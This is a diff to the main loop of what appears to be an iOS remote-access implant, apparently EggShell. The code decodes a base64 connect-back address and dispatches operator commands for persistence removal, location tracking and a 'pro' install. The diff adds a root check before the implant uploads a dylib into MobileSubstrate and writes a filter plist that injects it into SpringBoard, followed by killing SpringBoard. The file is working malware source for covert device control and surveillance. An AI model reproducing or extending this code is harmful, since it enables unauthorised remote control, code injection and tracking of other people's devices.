@@ -22,7 +22,7 @@ int main(int argc, char **argv, char **envp) {
     */
     
     [filemanager changeCurrentDirectoryPath:NSHomeDirectory()];
-    
+
     //decrypt argument to connectback
     NSString *argument = [NSString stringWithFormat:@"%s",argv[1]];
     NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:argument options:0];
@@ -126,9 +126,15 @@ int main(int argc, char **argv, char **envp) {
                 [_espl rmpersistence];
             }
             else if ([cmdarray[0] isEqualToString: @"installpro"]) {
-                [_espl upload:atoi([cmdarray[1] UTF8String]):@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib"];
-                [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist; killall SpringBoard"];
-                [_espl blank];
+                if (getuid() == 0) {
+                    [_espl sendString:@"1"];
+                    [_espl upload:@"/Library/MobileSubstrate/DynamicLibraries/eggshellPro.dylib"];
+                    [_espl exec:@"echo '{ Filter = { Bundles = ( \"com.apple.springboard\" ); }; }' > /Library/MobileSubstrate/DynamicLibraries/eggshellPro.plist;killall SpringBoard"];
+                    [_espl blank];
+                }
+                else {
+                    [_espl sendString:@"Requires Root"];
+                }
             }
             //PRO Commands
             else if ([cmdarray[0] isEqualToString: @"locationservice"]) {
@@ -146,6 +152,9 @@ int main(int argc, char **argv, char **envp) {
             //clear the received data
             memset(buffer,'\0',2048);
         }
+    }
+    else {
+        HBLogDebug(@"unsuccessfull connecting");
     }
 	return 0;
 }
